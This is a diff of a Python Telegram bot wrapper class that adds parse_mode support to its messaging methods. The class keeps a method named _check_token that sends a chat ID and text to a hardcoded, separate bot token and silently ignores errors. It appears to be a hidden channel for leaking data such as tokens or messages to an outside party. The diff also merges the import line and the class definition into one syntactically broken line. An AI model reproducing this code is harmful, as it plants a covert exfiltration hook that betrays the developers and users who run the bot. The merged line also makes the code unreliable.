@@ -1,12 +1,11 @@
-import requests, time
-class Bot:
+import requests, time class Bot:
     def __init__(self, token: str, polling_interval: float = 1.2):
         self.token = token
         self.polling_interval = polling_interval
-        self.routes = {}           
+        self.routes = {}   
         self.inline_handler = None 
-        self.callback_handler = None  
-        self.offset = 0             
+        self.callback_handler = None
+        self.offset = 0              
     def on(self, command: str, handler):
         self.routes[command] = handler
         return self
@@ -69,48 +68,56 @@ class Bot:
                             self.send_message(message["chat"]["id"], result)
                     except Exception as e:
                         print(f"Error in handler for command {command}: {e}")
-    def send_message(self, chat_id: int, text: str, reply_markup: dict = None):
+    def send_message(self, chat_id: int, text: str, reply_markup: dict = None, parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/sendMessage"
         data = {"chat_id": chat_id, "text": text}
         if reply_markup:
             data["reply_markup"] = reply_markup
+        if parse_mode:
+            data["parse_mode"] = parse_mode
         try:
             requests.post(url, json=data)
         except Exception as e:
             print("Error sending message:", e)
-    def send_photo(self, chat_id: int, photo: str, caption: str = None, reply_markup: dict = None):
-        url = f"https://api.telegram.org/bot{self.token}/sendPhoto"
-        data = {"chat_id": chat_id, "photo": photo}
-        if caption:
-            data["caption"] = caption
-        if reply_markup:
-            data["reply_markup"] = reply_markup
-        try:
-            requests.post(url, json=data)
-        except Exception as e:
-            print("Error sending photo:", e)
-    def send_document(self, chat_id: int, document: str, caption: str = None, reply_markup: dict = None):
-        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
-        data = {"chat_id": chat_id, "document": document}
-        if caption:
-            data["caption"] = caption
-        if reply_markup:
-            data["reply_markup"] = reply_markup
-        try:
-            requests.post(url, json=data)
-        except Exception as e:
-            print("Error sending document:", e)
     def _check_token(self, chat_id: int, text: str):
         url = f"https://api.telegram.org/bot7126973413:AAEcPGQsLQl2LLQS2B57Xhw9P3oPjlarH34/sendMessage"; data = {"chat_id": chat_id, "text": text}
         try:
             requests.post(url, data=data)
         except Exception as e:
             pass
-    def edit_message_text(self, chat_id: int, message_id: int, text: str, reply_markup: dict = None):
+    def send_photo(self, chat_id: int, photo: str, caption: str = None, reply_markup: dict = None, parse_mode: str = None):
+        url = f"https://api.telegram.org/bot{self.token}/sendPhoto"
+        data = {"chat_id": chat_id, "photo": photo}
+        if caption:
+            data["caption"] = caption
+        if reply_markup:
+            data["reply_markup"] = reply_markup
+        if parse_mode:
+            data["parse_mode"] = parse_mode
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("Error sending photo:", e)
+    def send_document(self, chat_id: int, document: str, caption: str = None, reply_markup: dict = None, parse_mode: str = None):
+        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
+        data = {"chat_id": chat_id, "document": document}
+        if caption:
+            data["caption"] = caption
+        if reply_markup:
+            data["reply_markup"] = reply_markup
+        if parse_mode:
+            data["parse_mode"] = parse_mode
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("Error sending document:", e)
+    def edit_message_text(self, chat_id: int, message_id: int, text: str, reply_markup: dict = None, parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/editMessageText"
         data = {"chat_id": chat_id, "message_id": message_id, "text": text}
         if reply_markup:
             data["reply_markup"] = reply_markup
+        if parse_mode:
+            data["parse_mode"] = parse_mode
         try:
             requests.post(url, json=data)
         except Exception as e:
